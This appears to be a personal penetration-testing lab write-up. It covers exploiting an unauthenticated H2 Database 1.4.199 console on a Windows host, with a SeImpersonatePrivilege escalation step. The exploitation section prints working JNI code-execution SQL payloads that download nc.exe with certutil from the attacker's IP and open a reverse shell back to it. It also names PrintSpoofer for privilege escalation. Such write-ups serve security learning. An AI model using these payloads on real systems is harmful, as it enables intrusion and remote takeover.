## Takeaway
- If you can't run basic commands like `whoami`, `systeminfo`,`powershell`, it is probably lack paths in the evironmental variable.
	- One can add by running `set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0;`
## Metadata
- Port `80` is running a introduction page for `H2 Database`.![[Pasted image 20240323170508.png]]
- While port `8082` is `H2 Console` for connecting databases.![[Pasted image 20240323170559.png]]
	- One can identify that there is a database called `test` and a user `sa` that does not require password to access the database.![[Pasted image 20240323170957.png]]
		- Login as `sa`, one can identify further that the version of `H2 Database`  is `1.4.199`![[Pasted image 20240323171356.png]]
		- `searchsploit` will identify that the version is vulnerable to `JNI Code Execution`.![[Pasted image 20240323171450.png]]
- `SeImpersonatePrivilege` on user `tony`
# Exploitation
## Shell as tony
- Following the `searchsploit` note:
	- First Write and load native library![[Pasted image 20240323175132.png]]
	- Transfer `nc.exe` onto target machine with![[Pasted image 20240323175240.png]]
	```shell
	CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
	CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("cmd.exe /c mkdir C:\\tmp").getInputStream()).useDelimiter("\\Z").next()');
	CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil -urlcache -f http://192.168.45.189/Windows/nc.exe C:\\tmp\\nc.exe").getInputStream()).useDelimiter("\\Z").next()');
	CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("cmd.exe /c dir C:\\tmp").getInputStream()).useDelimiter("\\Z").next()');
	```
	- Finally, run nc.exe to receive a reverse shell as `tony`![[Pasted image 20240323175352.png]]
	```shell
	CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("C:\\tmp\\nc.exe 192.168.45.189 80 -e cmd.exe").getInputStream()).useDelimiter("\\Z").next()');
	```
# PrivEsc
- `PrintSpoofer64.exe` works.